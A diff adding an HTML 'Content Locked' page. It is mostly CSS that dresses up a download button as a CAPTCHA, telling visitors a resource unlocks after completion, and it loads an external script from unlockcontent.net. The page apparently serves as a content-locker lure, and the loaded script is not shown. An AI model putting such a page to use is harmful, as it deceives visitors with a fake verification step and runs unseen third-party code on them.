@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en" style="height:100%;">			
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+				<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+								<meta name="viewport" content="width=device-width, initial-scale=1">
+								<meta name="googlebot" content="noindex">
+															<base >
+													
+				
+				<script type="text/javascript" src="js/jquery.min.js"></script>
+				<script type="text/javascript" src="js/jquery.tipsy.js"></script>		
+									<link rel="stylesheet" href="css/bootstrap.min.css">
+					<link rel="stylesheet" href="css/bootstrap-glyphicons.css">
+								<link rel="shortcut icon" href="ico/favicon.ico" type="image/x-icon">
+				<link rel="icon" href="ico/favicon.ico" type="image/x-icon">
+				
+				
+								
+								
+				
+				<link href='css/css5d2a.css?family=Lato' rel='stylesheet' type='text/css'>
+				<style>
+					/* ===== Tipsy ===== */
+			
+					.tipsy { padding: 4px; font-size: 11px; position: absolute; z-index: 100000; }
+		
+					.tipsy-inner { padding: 5px 7px 5px 8px; background-color: black; color: white; max-width: 300px; text-align: center; }
+					.tipsy-inner { border-radius: 3px; -moz-border-radius:3px; -webkit-border-radius:3px; }
+					.tipsy-arrow { position: absolute; background: url('gif/tipsy.gif') no-repeat top left; width: 9px; height: 5px; }
+					.tipsy-w { margin-left: 5px; }
+					.tipsy-w .tipsy-arrow { top: 50%; margin-top: -4px; left: 0; width: 5px; height: 9px; }
+		
+					body{
+						background-color:white;
+						font-size: 14px;
+					}
+					#offerlst{
+						font-size: 16px;
+					}
+					
+					.offerlst{
+			
+						background-color:rgba(239,239,239,0.5);
+						
+						border:1px solid white;
+						padding:20px;
+						border-radius:8px;
+						
+						min-height: 80px;
+						margin-bottom: 8px;
+						font-size: 16px;
+					}
+					.link_a, .link_a:link{
+						
+						
+						background-color: #F5F5F5;
+					    background-image: linear-gradient(to bottom, #FFFFFF, #E6E6E6);
+					    background-repeat: repeat-x;
+					    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) #B3B3B3;
+					    border-image: none;
+					    border-radius: 4px 4px 4px 4px;
+					    border-style: solid;
+					    border-width: 1px;
+					    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.2) inset, 0 1px 2px rgba(0, 0, 0, 0.05);
+					    color: #333333;
+					    cursor: pointer;
+					    display: inline-block;
+					    line-height: 20px;
+					    margin-bottom: 0;
+					    padding: 4px 12px;
+					    text-align: center;
+					    text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
+					    vertical-align: middle;
+		
+						font-weight: normal;
+						text-decoration:none;
+		
+						
+						
+					}
+					
+					.link_a:hover{
+						background-position: 0 -15px;
+					    transition: background-position 0.1s linear 0s;
+					}
+					.each_p_elm{
+						margin: 3px 0;
+		
+						padding: 3px;
+						white-space:nowrap;
+					}
+
+				</style>
+									
+					<style>
+						/* custom css */
+						body {
+    background: repeating-linear-gradient(
+      -55deg,
+      #333,
+      #222 3px,
+      #333 3px,
+      #333 6px
+    );
+}
+.offer_help_text {
+    font-size: 12px;
+    font-weight: normal;
+}
+.btn-large {
+    padding: 0;
+    font-size: 18px;
+    border-radius: 0;
+}
+.header-block {
+  color: #fff;
+}
+#smallTitle {
+  color: #fff;
+}
+
+.btn-danger:hover, .btn-danger:focus, .btn-danger:active, .btn-danger.active {
+    background-color: inherit;
+    border: none;
+}
+.btn:active, .btn.active {
+    outline: 0;
+    box-shadow: none;
+    border: none;
+}
+.btn:hover, .btn:focus {
+    color: inherit;
+    border: none;
+    outline: 0;
+}
+.glyphicon-download-alt {
+    position: relative;
+    top: 0;
+}
+.glyphicon-download-alt:before {
+    padding-right: 5px;
+    font-family: "Font Awesome 6 Free";
+    font-weight: 400;
+    content: "\f0c8";
+    font-size: 24px;
+    color: #bfbfbf;
+}
+.glyphicon-download-alt:hover::before {
+    padding-right: 5px;
+    font-family: "Font Awesome 6 Free";
+    font-weight: 400;
+    content: "\f14a";
+    font-size: 24px;
+    color: #bfbfbf;
+    cursor: pointer;
+}
+#btn_text {
+    width: 337px;
+    max-width: 75%;
+    position: relative;
+    top: -2px;
+    padding-left: 5px;
+    display: inline-block;
+    text-align: left;
+}
+#btn_text:before {
+    position: absolute;
+    font-size: 14px;
+    color: #bfbfbf;
+    font-weight: bold;
+    top: 30px;
+    right: -15px;
+    content: "CAPTCHA";
+
+}
+#btn_text:after {
+    padding-left: 10px;
+    font-family: "Font Awesome 6 Free";
+    font-weight: 900;
+    content: "\f2f1";
+    font-size: 32px;
+    position: absolute;
+    top: -11px;
+    right: 2px;
+    color: #007bff;
+}
+.dl_button {
+  color: #333;
+  background-color: transparent;
+  border: none;
+  max-width: 100%;
+}
+.dl_button:hover {
+  color: #333;
+  background-color: transparent;
+  border: none;
+  cursor: default;
+}
+hr {
+  margin-top: 20px;
+  margin-bottom: 20px;
+  border: 0;
+  border-top: 1px solid #eeeeee;
+}
+.link_a {
+  overflow: hidden;
+  white-space: nowrap;
+  text-overflow: ellipsis;
+  width: 100%;
+}
+
+.container {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100%;
+    border: none;
+
+}
+.head-container {
+    margin-left: auto;
+    margin-right:  auto;
+    margin-bottom: 15px;
+    margin-top:15px;
+    padding: 30px 5px 30px 5px;
+    font-size: 21px;
+    font-weight: 200;
+    line-height: 2.1428571435;
+    color: inherit;
+    background-color: #eee;
+    border-radius: 0px;
+    width: 450px;
+    max-width: 80%;
+}
+.lead {
+  text-align: center;
+  margin-left: auto;
+  margin-right: auto;
+}
+@media only screen and (max-width: 800px) {
+	.head-container {
+	    margin-right: auto;
+    	    margin-left: auto;
+	}
+	.container {
+	    margin-right: 0.5rem;
+    	    margin-left: 0.5rem;
+	}
+}
+
+
+							
+					</style>
+					
+				<title>Content Locked</title>
+			</head>
+			<body id="the_body" style="margin:0; height:100%; font-family: 'Lato', sans-serif;">
+												
+				<!--Begin -->
+				<link rel="stylesheet" href="css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+<div class="container">
+	<div class="header-block">
+		<div id="dynheader"><div style="text-align: center; font-weight: bold;"><span style="font-size: 20px;">Complete the CAPTCHA below to continue.</span></div></div>
+	</div>
+	
+	<br>
+	<div >
+		<p>
+				<center>
+					
+					
+					<div data-captcha-enable="true"></div>
+					
+					
+			    </center>
+				
+		</p>
+	</div>
+	<br>
+	
+	<p id="smallTitle" class="lead ">
+		After completion this resource will be unlocked.
+	</p>
+</div>				<!--End -->
+				
+
+<script type="text/javascript" src="https://unlockcontent.net/cp/js/onrjz"></script>
+
+
+				
+</body>
+		
+</html>
